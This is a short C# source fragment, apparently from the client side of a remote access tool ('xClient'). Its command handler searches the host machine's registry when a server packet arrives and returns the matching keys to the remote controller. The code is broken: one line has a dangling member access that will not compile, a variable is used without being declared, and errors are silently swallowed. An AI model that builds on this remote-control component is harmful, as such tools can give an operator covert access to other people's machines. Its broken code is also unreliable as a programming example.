using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Registry;
using xClient.Core.Networking;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {
        public static void HandleGetRegistryKey(xClient.Core.Packets.ServerPackets.DoLoadRegistryKey packet, Client client)
        {
            try
            {

                seeker = new RegistrySeeker()
                {
                    searchArgs = new RegSearchMatch(packet.RootKey)
                };

                seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
                        {
                            new xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse(e.Matches[0]. , packet.Identifier).Execute(client);
                        };
            }
            catch
            { }
        }
    }
}